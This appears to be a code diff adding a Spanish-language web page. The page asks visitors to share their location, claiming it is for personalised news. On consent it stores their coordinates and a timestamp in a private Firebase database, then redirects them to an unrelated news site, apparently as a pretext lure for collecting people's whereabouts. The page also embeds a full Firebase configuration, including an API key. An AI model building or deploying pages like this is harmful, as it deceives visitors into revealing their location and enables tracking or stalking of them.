@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Solicitar Ubicación</title>
+  <script type="module">
+    // Firebase SDKs
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    // Tu configuración
+    const firebaseConfig = {
+      apiKey: "AIzaSyDHb3MkiF8XDjweNYBazE08sETyF-Yuy0s",
+      authDomain: "base-de-datos-clientes-ea806.firebaseapp.com",
+      databaseURL: "https://base-de-datos-clientes-ea806-default-rtdb.firebaseio.com",
+      projectId: "base-de-datos-clientes-ea806",
+      storageBucket: "base-de-datos-clientes-ea806.firebasestorage.app",
+      messagingSenderId: "711168578601",
+      appId: "1:711168578601:web:2f4784c0382f63376ff838",
+      measurementId: "G-BX5D7X4DCM"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    function solicitarUbicacion() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const datos = {
+              latitud: position.coords.latitude,
+              longitud: position.coords.longitude,
+              timestamp: new Date().toISOString()
+            };
+            const refUbicaciones = push(ref(db, 'ubicaciones'));
+            set(refUbicaciones, datos).then(() => {
+              window.location.href = "https://www.eltiempo.com";
+            }).catch(err => {
+              alert("Error al guardar ubicación: " + err.message);
+            });
+          },
+          (error) => {
+            alert("No se pudo obtener ubicación: " + error.message);
+          }
+        );
+      } else {
+        alert("Este navegador no permite geolocalización.");
+      }
+    }
+
+    window.onload = () => {
+      document.getElementById("aceptarBtn").addEventListener("click", solicitarUbicacion);
+    };
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f3f3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .contenedor {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="contenedor">
+    <h2>¿Deseas compartir tu ubicación?</h2>
+    <p>Esto nos permite brindarte noticias relevantes.</p>
+    <button id="aceptarBtn">Aceptar</button>
+  </div>
+</body>
+</html>
